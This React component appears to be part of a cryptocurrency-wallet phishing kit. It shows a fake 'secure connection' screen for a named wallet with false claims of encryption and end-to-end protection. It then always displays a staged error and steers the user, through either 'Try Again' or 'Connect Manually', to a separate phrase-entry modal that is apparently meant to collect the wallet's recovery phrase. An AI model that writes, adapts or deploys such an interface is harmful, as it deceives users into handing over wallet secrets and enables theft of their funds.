import React, { useEffect, useState } from "react";
import "./styles/GearAnimation.css";
import { IoShieldHalfOutline } from "react-icons/io5";
import { motion } from "framer-motion";
import PhraseModal from "./PhraseModal";

const SecondModal = ({ wallet, onClose, isDarkMode }) => {
  const [showError, setShowError] = useState(false);
  const [isTryingAgain, setIsTryingAgain] = useState(false);
  const [showPhraseModal, setShowPhraseModal] = useState(false);
  const [showGear, setShowGear] = useState(true);

  // Initial 15-second countdown
  useEffect(() => {
    const timer = setTimeout(() => {
      setShowError(true);
      setShowGear(false);
    }, 5000);

    return () => clearTimeout(timer);
  }, []);

  // Handle "Try Again" logic
  const handleTryAgain = () => {
    setShowError(false);
    setIsTryingAgain(true);
    setShowGear(true);

    const retryTimer = setTimeout(() => {
      setIsTryingAgain(false);
      setShowGear(false);
      setShowPhraseModal(true);
    }, 10000); // 10 seconds

    return () => clearTimeout(retryTimer);
  };

  const handleManualConnect = () => {
    setShowPhraseModal(true);
  };

  if (showPhraseModal) {
    return (
      <PhraseModal
        wallet={wallet} // 👈 Pass the wallet object
        onClose={onClose}
        isDarkMode={isDarkMode}
      />
    );
  }

  return (
    <div
      className={`fixed inset-0 ${
        isDarkMode ? "bg-black/60" : "bg-blue-100/60"
      } flex items-center justify-center z-50 px-4`}
    >
      <motion.div
        initial={{ y: -100, opacity: 0 }}
        animate={{ y: 0, opacity: 1 }}
        exit={{ y: -100, opacity: 0 }}
        transition={{
          type: "spring",
          stiffness: 100,
          damping: 15,
          duration: 0.6,
          delay: 0.2,
        }}
        className={`${
          isDarkMode ? "bg-[#1e1e1e] text-white" : "bg-white text-black"
        } p-6 rounded-lg shadow-lg max-w-md w-full relative`}
      >
        {/* Close Button */}
        <button
          onClick={onClose}
          className="absolute top-2 right-2 text-red-600 font-bold"
        >
          ✕
        </button>

        {/* Header */}
        <div className="flex flex-col items-center justify-center text-center space-y-4">
          <img
            src={wallet.image}
            alt={wallet.name}
            className="w-14 h-14 rounded object-cover"
          />
          <h3 className="text-2xl font-semibold">{wallet.name}</h3>
          <span className="text-sm text-green-500">
            This session is secured and encrypted
          </span>
        </div>

        {/* Gear Animation */}
        {showGear && (
          <div className="flex flex-col items-center justify-center text-center space-y-4 mt-4">
            <div className="gearbox scale-75">
              <div className="overlay"></div>
              <div className="gear one">
                <div className="gear-inner">
                  <div className="bar"></div>
                  <div className="bar"></div>
                  <div className="bar"></div>
                </div>
              </div>
              <div className="gear two">
                <div className="gear-inner">
                  <div className="bar"></div>
                  <div className="bar"></div>
                  <div className="bar"></div>
                </div>
              </div>
              <div className="gear three">
                <div className="gear-inner">
                  <div className="bar"></div>
                  <div className="bar"></div>
                  <div className="bar"></div>
                </div>
              </div>
              <div className="gear four large">
                <div className="gear-inner">
                  <div className="bar"></div>
                  <div className="bar"></div>
                  <div className="bar"></div>
                  <div className="bar"></div>
                  <div className="bar"></div>
                  <div className="bar"></div>
                </div>
              </div>
            </div>
            <p>Starting secure connection</p>
            <span className="text-sm text-gray-400 dot-animate">
              Please wait
            </span>
          </div>
        )}

        {/* Error Message + Buttons */}
        {showError && !isTryingAgain && (
          <div className="text-center p-4">
            <p className="px-10 py-2 border border-red-400 text-red-400 text-[8px] rounded">
              An error occurred... please try again or connect manually
            </p>

            <div className="grid gap-4 py-5">
              <button
                onClick={handleTryAgain}
                className="border border-indigo-500 rounded-full py-3 hover:bg-indigo-700 hover:text-white text-indigo-400 cursor-pointer text-xs"
              >
                Try Again
              </button>
              <button
                onClick={handleManualConnect}
                className="border border-blue-500 rounded-full py-3 bg-indigo-600 hover:text-white text-white cursor-pointer text-xs hover:bg-indigo-700"
              >
                Connect Manually
              </button>
            </div>
          </div>
        )}

        {/* Footer Message */}
        <div className="text-center flex items-center justify-center gap-2 text-sm mt-4">
          <IoShieldHalfOutline className="text-2xl" />
          <p className="text-gray-400 text-sm">
            This session is protected with end-to-end encryption
          </p>
        </div>
      </motion.div>
    </div>
  );
};

export default SecondModal;
